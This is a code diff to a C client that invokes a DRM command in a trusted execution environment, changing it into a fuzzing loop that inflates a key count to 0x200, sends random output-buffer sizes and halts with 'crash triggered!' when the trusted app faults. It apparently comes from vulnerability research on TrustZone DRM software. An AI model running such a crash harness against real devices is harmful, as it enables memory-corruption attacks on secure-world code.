@@ -33,8 +33,9 @@ uint32_t load_hdcpkey(TEEC_Context *context, TEEC_Session *session)
     return 0;
 }
 
-void drm_query(TEEC_Context *context, TEEC_Session *session)
+void drm_query(unsigned int tmpref_size, TEEC_Context *context, TEEC_Session *session)
 {
+	printf("drm_query with %x\n", tmpref_size);
     void* mem_area1 = malloc(0x1000);
     memset(mem_area1, 0, 0x1000);
     int* int_mem_area = (int*)mem_area1;
@@ -42,7 +43,7 @@ void drm_query(TEEC_Context *context, TEEC_Session *session)
     *(uint8_t *)(mem_area1 + 1) = 0x42;
     *(uint8_t *)(mem_area1 + 2) = 0x50;
     *(uint8_t *)(mem_area1 + 3) = 0x4D;
-    int_mem_area[17] = 2; //keycount
+    int_mem_area[17] = 0x200; //keycount
     int_mem_area[18] = 0x1337; // drmKeyId
     
     TEEC_Operation op;
@@ -53,10 +54,18 @@ void drm_query(TEEC_Context *context, TEEC_Session *session)
     op.params[0].tmpref.buffer = mem_area1;  // the keyblock buffer
     op.params[0].tmpref.size =  0x370; 
     op.params[1].tmpref.buffer = (void*)malloc(0x1000);  // the keyblock buffer
-    op.params[1].tmpref.size =  0x4; 
+    op.params[1].tmpref.size =  tmpref_size; 
     uint32_t err_origin;
 
     TEEC_Result res = TEEC_InvokeCommand_impl(session, 0x1, &op, &err_origin);
+	printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
+#if EMULATE
+#else
+	if(err_origin != 4){
+		printf("crash triggered!\n");
+		while(1){}
+	}
+#endif
 }
 
 
@@ -102,7 +111,11 @@ int main(int argc, char **argv)
 
     // write banner
     printf("[+] drm query...\n");
-    drm_query(&context, &session);
+	unsigned int tmpref_size;
+	while(1){
+		tmpref_size = (unsigned int)(rand() % (0x100 + 1))+ 1;
+		drm_query(tmpref_size, &context, &session);
+	}
     printf("[+] done...\n");
     TEEC_CloseSession_impl(&session);
     TEEC_FinalizeContext_impl(&context);
